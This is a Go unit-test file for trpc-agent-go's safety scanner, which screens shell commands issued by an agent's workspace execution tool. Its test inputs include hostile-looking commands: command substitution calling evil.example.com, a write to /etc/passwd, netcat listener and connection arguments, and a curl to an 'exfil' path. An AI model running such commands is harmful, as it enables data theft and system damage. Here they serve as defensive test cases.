//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"reflect"
	"strings"
	"testing"
)

func TestParsePipelineOK(t *testing.T) {
	segs, err := parsePipeline("cat data.txt | grep foo")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(segs) != 2 || segs[0][0] != "cat" || segs[1][0] != "grep" {
		t.Errorf("unexpected segments: %+v", segs)
	}
}

func TestParsePipelineRejectsUnsafe(t *testing.T) {
	for _, cmd := range []string{
		"echo $(whoami)",
		"echo `id`",
		"cat file > /etc/passwd",
		"FOO=bar curl http://x",
	} {
		if _, err := parsePipeline(cmd); err == nil {
			t.Errorf("expected parse rejection for %q", cmd)
		}
	}
}

// TestUnsafeConstructDenied verifies parse failures become a deny under the
// default policy (never a silent allow).
func TestUnsafeConstructDenied(t *testing.T) {
	sc := NewScanner(nil)
	r := sc.Scan(context.Background(), ScanInput{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo $(curl http://evil.example.com)",
	})
	if r.Decision != DecisionDeny {
		t.Fatalf("decision=%s want deny; findings=%+v", r.Decision, r.Findings)
	}
	if !hasRule(r, RuleUnsafeConstruct) {
		t.Errorf("missing unsafe-construct finding: %+v", r.Findings)
	}
}

func TestExtractHosts(t *testing.T) {
	cases := []struct {
		argv []string
		want []string
	}{
		{[]string{"curl", "http://evil.example.com/x"}, []string{"evil.example.com"}},
		{[]string{"curl", "-sSL", "https://proxy.golang.org/list"}, []string{"proxy.golang.org"}},
		{[]string{"scp", "file", "user@10.0.0.1:/tmp"}, []string{"10.0.0.1"}},
		// A scheme-less bare token is treated as a possible local file, not a
		// host, so it is not extracted (avoids the download-filename false deny).
		{[]string{"curl", "example.com/path"}, nil},
		{[]string{"nc", "host", "4444"}, []string{"host"}},
		{[]string{"nc", "-lvp", "4444"}, nil},
		// A local output filename with a dot must not be treated as a host.
		{[]string{"curl", "-o", "release.tar.gz", "https://github.com/x"}, []string{"github.com"}},
		{[]string{"scp", "archive.tar.gz", "user@github.com:/tmp"}, []string{"github.com"}},
		// Multiple targets: all are returned so a mixed allow/deny command
		// cannot pass on the first host alone.
		{[]string{"curl", "https://github.com/ok", "https://evil.example.com/exfil"}, []string{"github.com", "evil.example.com"}},
	}
	for _, c := range cases {
		if got := extractHosts(c.argv); !reflect.DeepEqual(got, c.want) {
			t.Errorf("extractHosts(%v)=%v want %v", c.argv, got, c.want)
		}
	}
}

func TestCommandBase(t *testing.T) {
	cases := map[string]string{
		"curl":                         "curl",
		"/usr/bin/Curl":                "curl",
		"./rm":                         "rm",
		"CMD.EXE":                      "cmd",
		`C:\Windows\System32\curl.exe`: "curl",
	}
	for in, want := range cases {
		if got := commandBase(in); got != want {
			t.Errorf("commandBase(%q)=%q want %q", in, got, want)
		}
	}
}

func TestSplitScriptLines(t *testing.T) {
	script := "# comment\n\ngo build ./... \\\n  -o bin/app\nls\n"
	lines := splitScriptLines(script)
	if len(lines) != 2 {
		t.Fatalf("lines=%v want 2", lines)
	}
	if !strings.Contains(lines[0], "go build ./...") || !strings.Contains(lines[0], "-o bin/app") {
		t.Errorf("continuation not joined onto one line: %q", lines[0])
	}
	if lines[1] != "ls" {
		t.Errorf("lines[1]=%q want ls", lines[1])
	}
}
